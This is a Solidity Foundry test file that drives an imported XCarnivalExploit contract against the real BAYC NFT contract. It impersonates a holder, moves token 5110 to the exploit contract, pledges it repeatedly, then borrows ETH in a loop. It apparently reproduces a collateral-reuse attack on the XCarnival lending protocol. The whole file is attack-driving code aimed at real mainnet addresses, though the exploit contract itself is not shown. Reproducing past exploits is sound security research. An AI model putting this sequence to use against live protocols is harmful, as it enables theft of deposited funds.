// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.12;

import "../XCarnivalExploit.sol";

contract ContractTest is Test {
    XCarnivalExploit x;
    address bayc = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;

    function setUp() public {
        x = new XCarnivalExploit();
    }

    function testXCarnival() public {

        vm.prank(address(0xf70F691D30ce23786cfb3a1522CFD76D159AcA8d));
        IBAYC(bayc).transferFrom(0xf70F691D30ce23786cfb3a1522CFD76D159AcA8d, address(x), 5110);

        for( uint8 i; i < 10; i++) {
            if (i != 0) {
                IBAYC(bayc).transferFrom(address(this), address(x), 5110);
            }
            x.makePledge();
        }

        for( uint8 i; i < 10; i++) {
            x.borrowEth(11 + i);
        }

    }

    receive() external payable {}
}
